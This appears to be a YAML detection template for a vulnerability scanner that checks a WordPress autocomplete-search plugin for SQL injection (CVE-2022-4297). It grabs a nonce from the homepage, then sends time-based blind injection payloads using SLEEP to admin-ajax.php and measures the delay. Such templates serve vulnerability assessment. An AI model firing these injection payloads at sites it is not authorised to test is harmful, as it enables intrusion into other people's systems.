name: yaml-poc-netflixtech-wp_autocomplete_search-sql_injection-CVE-2022-4297
binding: 273f7093-0d71-4d1d-9faa-a4c9f44ed48e
detail:
    author: jiapeng.han
    links:
        - https://wpscan.com/vulnerability/e2dcc76c-65ac-4cd6-a5c9-6d813b5ac26d
    vulnerability:
        id: ceb0f328-cf2c-4601-8db7-c873365ffe58
        level: critical
    warning: Harmless
transport: http
set:
    rInt0: randomInt(4, 7)
rules:
    nonce:
        request:
            cache: true
            method: GET
            path: /
            follow_redirects: true
        expression: response.status == 200 && response.body_string.contains("wp_autosearch_config")
        output:
            nonce: '''wp_autosearch_config.*?nonce":"(?P<nonce>.*?)"''.bsubmatch(response.body)["nonce"]'
    r1:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: action=wi_get_search_results&security={{nonce}}&q=123" AND (SELECT 1 FROM (SELECT(SLEEP(0)))HIdl)-- CmWf
            follow_redirects: false
        expression: "true"
        output:
            CheckTimeOut: response.latency
    r2:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: action=wi_get_search_results&security={{nonce}}&q=123" AND (SELECT 1 FROM (SELECT(SLEEP({{rInt0}})))HIdl)-- CmWf
            follow_redirects: false
        expression: response.latency - CheckTimeOut >= rInt0 * 1000 - 1000
expression: nonce() && r1() && r2()
